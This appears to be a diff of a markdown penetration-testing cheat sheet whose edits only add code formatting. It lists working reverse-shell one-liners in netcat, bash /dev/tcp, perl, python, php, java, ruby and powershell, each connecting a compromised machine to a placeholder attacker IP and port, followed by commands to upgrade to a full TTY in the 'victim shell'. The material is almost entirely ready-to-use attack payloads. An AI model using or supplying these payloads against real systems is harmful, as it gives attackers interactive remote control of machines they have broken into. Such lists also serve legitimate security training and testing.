@@ -1,40 +1,40 @@
 ## getting a reverse shell:-
 ### Try using netcat as follows:-
-1. on your attacker machine set up a listener by:- nc -lvp "port"
-2. on the compromised machine connect with the listener and spawn shell by:- nc -e /bin/bash "attacking machine IP" "port"
+1. on your attacker machine set up a listener by:- `nc -lvp "port"`
+2. on the compromised machine connect with the listener and spawn shell by:- `nc -e /bin/bash "attacking machine IP" "port"`
 3. If -e flag is missing then use this `mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ip port > /tmp/f`
 
 ### If netcat doesnt work then use netcat to set up listener in the attacker machine via netcat and use the following to get a reverse shell back
-/bin/bash -i >& /dev/tcp/IP/PORT 0>&1 (via bash)<br />
+`/bin/bash -i >& /dev/tcp/IP/PORT 0>&1` (via bash)<br />
 or<br />
-perl -e 'use Socket;$i="IP";$p="PORT";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};' (via perl)<br />
+`perl -e 'use Socket;$i="IP";$p="PORT";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'` (via perl)<br />
 or<br />
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' (via python) <br />
+`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'` (via python) <br />
 or<br />
-php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");' (via php)<br />
+`php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'` (via php)<br />
 or<br />
-r = Runtime.getRuntime()
+`r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor() (via java)<br />
+p.waitFor()` (via java)<br />
 or<br />
-ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)' (via ruby)<br />
+`ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'` (via ruby)<br />
 or<br />
-powershell -c "$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" (via powershell)
+`powershell -c "$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` (via powershell)
 # getting a tty shell:-
-python -c ‘import pty; pty.spawn("/bin/bash")’<br />
+`python -c ‘import pty; pty.spawn("/bin/bash")’`<br />
 or<br />
-python3 -c ‘import pty; pty.spawn("/bin/bash")’<br />
+`python3 -c ‘import pty; pty.spawn("/bin/bash")’`<br />
 or<br />
-python -c ‘import pty; pty.spawn("/bin/sh")’<br />
+`python -c ‘import pty; pty.spawn("/bin/sh")’`<br />
 or<br />
-python3 -c ‘import pty; pty.spawn("/bin/bash")’<br />
+`python3 -c ‘import pty; pty.spawn("/bin/bash")’`<br />
 or<br />
-SHELL="/bin/bash" script -q /dev/null<br />
+`SHELL="/bin/bash" script -q /dev/null`<br />
 
 ## getting a colored tty shell (after getting a tty shell):- 
 #### *do this in your host machine because u need the length and breadth of the window of ur terminal*
 
-stty -a <br />
+`stty -a` <br />
 #### *then do the following in the victim shell*<br />
 export SHELL=/bin/bash<br />
 export TERM=xterm256-color<br />
